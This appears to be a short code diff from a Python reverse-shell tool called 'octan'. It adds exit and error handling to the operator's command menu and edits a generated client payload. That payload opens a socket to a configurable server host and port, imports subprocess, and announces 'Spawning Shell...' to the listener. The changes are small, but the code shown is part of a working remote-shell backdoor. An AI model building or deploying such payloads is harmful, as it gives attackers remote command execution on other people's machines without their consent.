@@ -51,6 +51,10 @@ class octan_shell:
                 octan.show()
             elif cmd_clean == "help":
                 octan.help()
+            elif cmd_clean == "exit":
+                exit()
+            else:
+                print(f"{Fore.RED}[-]{Fore.RESET} Command not found!\n")
 
 class octan:
     def listen(ADDR, PORT, SEP, TARGET, printf=True):
@@ -155,8 +159,6 @@ import time
 import socket
 import subprocess
 
-from colorama import Fore, Back
-
 SERVER_HOST = "{addr}"
 SERVER_PORT = {port}
 BUFFER_SIZE = 1024 * 128
@@ -166,7 +168,7 @@ while True:
     try:
         s = socket.socket()
         s.connect((SERVER_HOST, SERVER_PORT))
-        first_message = Fore.GREEN+"[+]"+Fore.RESET+" Spawning Shell..."+SEPARATOR
+        first_message = "\\x1b[32m[+]\\x1b[39m Spawning Shell..."+SEPARATOR
         s.send(first_message.encode())
 
         while True:
